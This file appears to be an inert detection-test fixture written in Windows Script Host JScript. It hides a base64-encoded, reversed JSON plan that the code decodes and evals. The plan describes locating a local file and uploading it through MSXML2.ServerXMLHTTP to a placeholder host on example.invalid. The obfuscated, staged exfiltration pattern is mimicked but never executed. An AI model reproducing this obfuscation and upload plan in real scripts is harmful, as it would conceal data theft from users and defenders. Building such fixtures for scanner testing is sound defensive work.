// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_7b55626f = function decode_7b55626f_body(SoUrCeByTeS) {
  var DeCoDeDByTeS = SoUrCeByTeS.slice(0);
  DeCoDeDByTeS.reverse();
  return DeCoDeDByTeS;
};
var recover_ee20c63b = function recover_ee20c63b_body() {
  var packedText = "fTM6InRudW9DZWdhdHMiLH0idGFkLjBiZjY1OWIyMmQtZWdhdHNcXGJhTHNzZXJ0bnVIXFxjaWxidVBcXHNyZXNVXFw6QyI6Imh0YXBfZWxpZiIsIjBiZjY1OWIyMmQvYmFMc3NlcnRudUgiOiJ0bmVnYV9yZXN1IiwidGFkLmY0OTJiMGVhL2RpbGF2bmkuZWxwbWF4ZS4wYmY2NTliMjJkLy86c3B0dGgiOiJscnUiLCIwYmY2NTliMjJkLW5naWFwbWFjIjoiZGlfbmdpYXBtYWMiezoic2V1bGF2IiwiMC42LlBUVEhMTVhyZXZyZVMuMkxNWFNNIjoicmV0cGFkYSIsXSJldG9tZXJfZGFvbHB1IiwicmVmc25hcnRfZXJhcGVycCIsImxhY29sX2V0YWNvbCJbOiJzcGV0cyJ7";

  var SoUrCeByTeS = decodeBase64(packedText);

  var NeUtRaL = ["north", "south"].join(":");

  var DeCoDeDByTeS = decode_7b55626f.call(null, SoUrCeByTeS);

  var textParts = [];

  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }

  var DeScRiPtOrTeXt = textParts.join("");

  return DeScRiPtOrTeXt;
};
var inspect_6d793576 = function inspect_6d793576_body() {
  var DeScRiPtOr = eval("(" + recover_ee20c63b.call(null) + ")");
  var PlAn = new Object();
  PlAn.steps = DeScRiPtOr.steps;
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn.values = DeScRiPtOr.values;
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
};
